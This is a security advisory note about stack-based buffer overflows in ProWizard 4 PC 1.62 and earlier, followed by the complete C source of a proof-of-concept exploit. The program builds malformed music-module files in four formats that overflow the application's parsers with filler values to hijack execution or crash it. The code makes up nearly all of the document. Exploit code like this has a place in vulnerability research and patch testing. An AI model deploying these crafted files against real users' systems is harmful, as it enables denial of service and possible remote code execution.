source: http://www.securityfocus.com/bid/26953/info

ProWizard 4 PC is prone to multiple stack-based buffer-overflow issues because it fails to perform adequate boundary checks on user-supplied data.

Successfully exploiting these issues allows remote attackers to execute arbitrary code in the context of the application. Failed exploit attempts likely result in denial-of-service conditions.

These issues affect ProWizard 4 PC 1.62 and prior versions; other versions may also be vulnerable. 

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>



#define VER     "0.1"
#define BUFFSZ  0xffff
#define BOFCHR  0x58585858
#define u8      unsigned char



int putxx(u8 *data, unsigned num, int bits);
void std_err(void);



int main(int argc, char *argv[]) {
    FILE    *fd;
    int     i,
            j,
            attack,
            samp_off,
            inst_off,
            songs_off,
            bofnum;
    u8      *fname,
            *buff,
            *p,
            *file_size;

    setbuf(stdout, NULL);

    fputs("\n"
        "Pro-Wizard <= 1.62 multiple buffer-overflow "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <output_file>\n"
            "\n"
            "Attack:\n"
            " 1 = AMOS-MusicBank\n"
            " 2 = FuzzacPacker\n"
            " 3 = QuadraComposer\n"
            " 4 = SkytPacker (unexploitable due to only one byte in a 32 bit array)\n"
            "\n", argv[0]);
        exit(1);
    }

    attack = atoi(argv[1]);
    fname  = argv[2];

    buff = malloc(BUFFSZ);
    if(!buff) std_err();
    memset(buff, 0, BUFFSZ);
    p = buff;

    songs_off = 256;    // some values
    samp_off  = 256;
    inst_off  = 1024;
    bofnum    = 255;
    file_size = NULL;

    if(attack == 1) {
        printf("- AMOS-MusicBank\n");

        p += putxx(p, 'A',          8);
        p += putxx(p, 'm',          8);
        p += putxx(p, 'B',          8);
        p += putxx(p, 'k',          8);
        p += putxx(p, 0x00,         8);
        p += putxx(p, 0x03,         8);
        p += putxx(p, 0x00,         8);
        p += putxx(p, 0x01,         8);
        file_size = p;                      // BANK_LEN
        p += 4;
        p += putxx(p, 'M',          8);
        p += putxx(p, 'u',          8);
        p += putxx(p, 's',          8);
        p += putxx(p, 'i',          8);
        p += putxx(p, 'c',          8);
        p += putxx(p, ' ',          8);
        p += putxx(p, ' ',          8);
        p += putxx(p, ' ',          8);
        p += putxx(p, inst_off,     32);    // INST_HDATA_ADDY
        p += putxx(p, songs_off,    32);    // SONGS_DATA_ADDY
        p += putxx(p, 0,            32);    // PAT_DATA_ADDY
        p = buff + (songs_off + 0x14);
        p += putxx(p, 1,            16);
        p += putxx(p, 0,            32);
        p = buff + (inst_off + 0x14);

        p += putxx(p, bofnum,       16);    // samples
        for(i = 0; i < bofnum; i++) {
            putxx(p, BOFCHR,   32);
            p += 32;
        }

        putxx(file_size, (p - buff) - 12, 32);

    } else if(attack == 2) {
        printf("- FuzzacPacker\n");

        p += putxx(p, 'M',          8);
        p += putxx(p, '1',          8);
        p += putxx(p, '.',          8);
        p += putxx(p, '0',          8);
        p += 2 + (68 * 31);
        p += putxx(p, bofnum,       8);     // PatPos
        p += putxx(p, 0,            8);     // NbrTracks
        p = buff + 2118;

        for(i = 0; i < (4 * bofnum * 4); i++) {
            p += putxx(p, bofnum,   8);
        }
        p += putxx(p, BOFCHR, 32);

    } else if(attack == 3) {
        printf("- QuadraComposer\n");

        bofnum = 32;    // max 32

        p += putxx(p, 'F',          8);
        p += putxx(p, 'O',          8);
        p += putxx(p, 'R',          8);
        p += putxx(p, 'M',          8);
        file_size = p;
        p += 4;
        p += putxx(p, 'E',          8);
        p += putxx(p, 'M',          8);
        p += putxx(p, 'O',          8);
        p += putxx(p, 'D',          8);
        p += putxx(p, 'E',          8);
        p += putxx(p, 'M',          8);
        p += putxx(p, 'I',          8);
        p += putxx(p, 'C',          8);
        p = buff + 22 + 41;
        p += putxx(p, bofnum,       8);
        for(i = 0; i < bofnum; i++) {
            p[0] = i + 0x70;
            putxx(p + 2, BOFCHR / 2, 16);
            putxx(p + 30, BOFCHR,   32);
            p += 34;
        }
        p += 1000;

        putxx(file_size, (p - buff) - 8, 32);

    } else if(attack == 4) {
        printf("- SkytPacker\n");

        p += 256;
        p += putxx(p, 'S',          8);
        p += putxx(p, 'K',          8);
        p += putxx(p, 'Y',          8);
        p += putxx(p, 'T',          8);
        p = buff + 260;
        p += putxx(p, bofnum - 1,   8);
        for(i = 0; i < bofnum; i++) {
            for(j = 0; j < 4; j++) {
                p += putxx(p, BOFCHR, 8);
                p += putxx(p, BOFCHR, 8);
            }
        }
        p += 22529;

    } else {
        printf("\nError: wrong attack number (%d)\n", attack);
        exit(1);
    }

    printf("- create file %s\n", fname);
    fd = fopen(fname, "wb");
    if(!fd) std_err();
    fwrite(buff, 1, p - buff, fd);
    fclose(fd);
    free(buff);
    printf("- done\n");
    return(0);
}



int putxx(u8 *data, unsigned num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;

    for(i = 0; i < bytes; i++) {
        data[i] = (num >> ((bytes - 1 - i) << 3)) & 0xff;
    }
    return(bytes);
}



void std_err(void) {
    perror("\nError");
    exit(1);
}


